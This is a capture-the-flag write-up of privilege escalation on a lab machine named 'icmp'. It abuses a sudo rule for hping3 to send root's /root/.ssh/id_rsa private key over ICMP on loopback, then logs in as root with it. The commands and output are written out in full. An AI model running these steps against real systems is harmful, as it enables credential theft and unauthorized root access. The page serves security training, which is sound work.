---
layout: default
title: hping3
parent: Sudo
nav_order: 10
---

# hping3 (Sudo)

---

## Check Sudo Permissions

```bash
$ sudo -l
[sudo] password for fox:
Matching Defaults entries for fox on icmp:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User fox may run the following commands on icmp:
    (root) /usr/sbin/hping3 --icmp *
    (root) /usr/bin/killall hping3

```

We can use sudo permissions on _hping3_

Checking GTFOBins for _hping3_ exploits.

![gtfobins](../../../../assets/images/ctfs/proving_grounds/icmp/gtfobins.png)

We should be able to use this exploit to send the _root_ user _.ssh/id_rsa_ private key to our attack machine.

```bash
# open a second ssh session as user fox
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY]
└─$ ssh fox@192.168.226.218
$ whoami
fox

# Now listen for hping3 traffic locally on loopback 127.0.0.1

$ sudo hping3 --icmp 127.0.0.1 --listen signature --safe
Warning: Unable to guess the output interface
hping3 listen mode
[main] memlockall(): Success
Warning: can't disable memory paging!

# Finally we send the /root/.ssh/id_rsa private key

$ sudo /usr/sbin/hping3 --icmp 127.0.0.1 -d 100 --sign signature --file /root/.ssh/id_rsa
HPING 127.0.0.1 (lo 127.0.0.1): icmp mode set, 28 headers + 100 data bytes
[main] memlockall(): Success
Warning: can't disable memory paging!
len=128 ip=127.0.0.1 ttl=64 id=9781 icmp_seq=0 rtt=2.6 ms


```

As we can see the file is printed line by line in our second SSH session.

![hping](../../../../assets/images/ctfs/proving_grounds/icmp/hping.png)

We now have the private rsa key for the root user and can simply SSH as root

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/icmp]
└─$ ssh -i id_rsa root@192.168.226.218
Linux icmp 4.19.0-11-amd64 #1 SMP Debian 4.19.146-1 (2020-09-17) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Aug 23 20:18:10 2022
root@icmp:~# id
uid=0(root) gid=0(root) groups=0(root)

```
